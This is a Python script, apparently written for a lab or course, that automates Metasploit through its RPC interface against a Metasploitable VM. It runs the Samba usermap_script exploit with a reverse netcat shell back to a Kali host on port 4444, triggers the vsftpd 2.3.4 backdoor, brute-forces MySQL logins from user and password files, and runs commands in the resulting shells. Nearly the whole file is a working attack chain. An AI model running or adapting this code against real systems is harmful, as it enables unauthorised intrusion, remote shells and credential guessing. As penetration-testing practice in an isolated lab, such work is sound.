from pymetasploit3.msfrpc import *
from pymetasploit3.msfconsole import MsfRpcConsole
import time
import os

# IP address from Metasploitable
METASPLOITABLE_IP = '192.168.140.182'
KALI_IP = '192.168.140.254'


class Metasploit:
    port = 55552
    exploit: ExploitModule = None
    payload: PayloadModule = None
    shell: ShellSession = None
    console: MsfConsole = None
    session_id: str = None

    def __init__(self, pwd):
        try:
            self.client = MsfRpcClient(password=pwd, port=self.port)
        except Exception as e:
            print('Error en el cliente: ', e)

    def create_exploit(self, exploit: type(exploit), rhost=None):
        self.exploit = self.client.modules.use('exploit', exploit)
        if rhost:
            self.exploit['RHOSTS'] = rhost

    def create_payload(self, payload, lhost=None, lport=None):
        self.payload = self.client.modules.use('payload', payload)
        if lhost:
            self.payload['LHOST'] = lhost
        if lport:
            self.payload['LPORT'] = lport

    def create_console(self):
        try:
            # Create console
            console_id = self.client.consoles.console().cid
            self.console = self.client.consoles.console(console_id)

            self.exploit.execute(payload=self.payload)

            for seconds in range(1, 6):
                print('\rConectando' + '.'*seconds,  end='')
                time.sleep(1)

            if self.payload:
                self.console.run_module_with_output(self.exploit, self.payload)
            else:
                self.console.run_module_with_output(self.exploit)

            # Connect to the last session created
            for id in self.client.sessions.list.keys():
                self.session_id = id

            print('\tOk')

        except Exception as e:
            print('Shell error: ', e)

    def console_write(self, command, session_id):
        self.shell = self.client.sessions.session(session_id)

        print(f'''\t\tCommando CMD:\t{command}''')
        self.shell.write(command)
        print(f'''\t\tRespuesta:\n''')

        time.sleep(5)
        resp = self.shell.read()
        if resp == '':
            print('\rRetry...', end='')
            self.shell.write(command)
            time.sleep(2)
            print('\t\t\t', self.shell.read())
        else:
            print('\t\t\t', resp)

    def console_terminate(self):
        try:
            for id in self.client.sessions.list.keys():
                print(f'''Cerrando sesion: {id}''')
                self.client.sessions.session(id).stop()
        except Exception as e:
            print('Error cerrando sesion: ', e)

    def get_session(self):
        info = self.client.sessions.list.get(self.session_id)

        print(f'''\tHost objetivo:\t{info['tunnel_peer']}''')
        print(f'''\tExploit:\t{info['via_exploit']}''')
        print(f'''\tPayload:\t{info['via_payload']}''')

    def get_job(self):
        job_id = None
        for id in self.client.jobs.list:
            job_id = id

        info = self.client.jobs.info(job_id)

        print(f'''\tHost objetivo:\t{info['datastore']['RHOSTS']}''')
        print(f'''\tExploit:\t{info['name']}''')


if __name__ == '__main__':
    vul_1 = Metasploit('1234')
    vul_2 = Metasploit('1234')
    vul_3 = Metasploit('1234')
    try:
        # Vulnerability: Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        print('\nVulnerabilidad:\tSamba smbd 3.X - 4.X')
        vul_1.create_exploit('exploit/multi/samba/usermap_script', METASPLOITABLE_IP)
        vul_1.create_payload('cmd/unix/reverse_netcat', KALI_IP, '4444')
        vul_1.create_console()

        smbd_id = vul_1.session_id
        vul_1.get_session()

        vul_1.console_write('whoami', smbd_id)
        vul_1.console_terminate()

    except Exception as e:
        print('Console error: ', e)
        vul_1.console_terminate()

    try:
        # Vulnerability: vsftpd 2.3.4
        print('\nVulnerabilidad:\tvsftpd 2.3.4')
        vul_2.create_exploit('unix/ftp/vsftpd_234_backdoor', METASPLOITABLE_IP)
        vul_2.create_payload('cmd/unix/interact')
        vul_2.create_console()

        vsftpd_id = vul_2.session_id
        vul_2.get_session()

        vul_2.console_write('ifconfig', vsftpd_id)
        vul_2.console_terminate()

    except Exception as e:
        print('Console error: ', e)
        vul_2.console_terminate()

    try:
        # Vulnerability: MySQL 5.0.51a-3ubuntu5
        print('\nVulnerabilidad:\tMySQL 5.0.51a-3ubuntu5')

        # Join users and password paths
        current_directory = os.getcwd()
        pwd_directory = os.path.join(current_directory, 'passwords.txt')
        users_directory = os.path.join(current_directory, 'users.txt')

        # Create external console to write directly and show cmd output
        console = MsfRpcConsole(vul_3.client)

        # Exploit credentials with .txt containing pwd and user to exploit MySql
        console.execute('use scanner/mysql/mysql_login')
        console.execute(f'set RHOSTS {METASPLOITABLE_IP}')
        # console.execute('set PASSWORD msfadmin')
        console.execute(f'set PASS_FILE {pwd_directory}')
        console.execute(f'set USER_FILE {users_directory}')
        console.execute('run')

        # Wait until Exploit ends
        console_exec = console.console.read()
        while console_exec['busy']:
            time.sleep(1)

        # console.lock.release()

    except Exception as e:
        print('Console error: ', e)
        vul_3.console_terminate()
